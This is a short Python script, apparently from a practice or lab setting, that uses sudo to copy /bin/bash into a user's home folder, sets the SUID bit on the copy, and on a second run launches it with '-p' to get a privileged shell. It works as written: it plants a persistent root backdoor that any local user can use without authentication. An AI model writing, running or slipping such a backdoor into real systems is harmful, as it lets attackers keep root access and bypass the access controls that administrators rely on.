def PruebaSUID():
  import os
  import os.path

  if os.path.isfile('/home/user3files/bash'):
        print("Bash existente ... ingresando al modo con privilegios")
        os.system('./bash -p')
  else:
        com1 = 'sudo cp -rp /bin/bash /home/user3files'
        com2 = 'sudo chmod u+s bash'
        os.system(com1)
        os.system(com2)
        print("Bash copiado, ejecutar el programa de nuevo")
PruebaSUID()
